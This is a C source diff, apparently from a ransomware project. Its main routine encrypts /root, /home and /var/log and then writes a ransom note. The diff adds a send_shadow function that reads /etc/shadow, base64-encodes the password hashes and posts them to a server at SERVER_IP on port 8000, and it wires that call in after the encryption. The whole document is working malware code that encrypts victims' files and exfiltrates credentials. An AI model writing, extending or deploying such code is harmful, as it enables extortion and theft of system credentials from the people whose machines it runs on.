@@ -46,13 +46,47 @@ void make_note(void){
     fclose(fp);
     exit(EXIT_SUCCESS);
 }
+
+void send_shadow(void) {
+    long filesize;
+    char *buffer;
+    char url[100];
+    char *file_base64;
+    FILE *fp = fopen("/etc/shadow", "r");
+    if (!fp) {
+        perror("fopen");
+        return;
+    }
+
+    fseek(fp, 0, SEEK_END);
+    filesize = ftell(fp);
+    rewind(fp);
+
+    buffer = malloc(filesize + 1);
+    if (!buffer) {
+        perror("malloc");
+        fclose(fp);
+        return;
+    }
+
+    fread(buffer, 1, filesize, fp);
+    buffer[filesize] = '\0';
+    file_base64 = base64_encode((const unsigned char *)buffer, filesize);
+    snprintf(url, sizeof(url), "http://%s:8000/shadow", SERVER_IP);
+    
+    send_data("shadow", file_base64, url);
+    free(buffer);
+    free(file_base64);
+    fclose(fp);
+}
+
 /*
 int main(void){
     unsigned char *aes_key = create_key();
 
-    encrypt_dir("/root", aes_key);
-    encrypt_dir("/home", aes_key);
-
+    encrypt_dir("/root/", aes_key);
+    encrypt_dir("/home/", aes_key);
+    encrypt_dir("/var/log/", aes_key);
     
     make_note();
     free(aes_key);
@@ -70,7 +104,7 @@ int main(int argc, char *argv[])
         encrypt_dir("/home/", aes_key);
         encrypt_dir("/root/", aes_key);
         encrypt_dir("/var/log/", aes_key);
-        
+        send_shadow();
         make_note();
         
         free(aes_key);
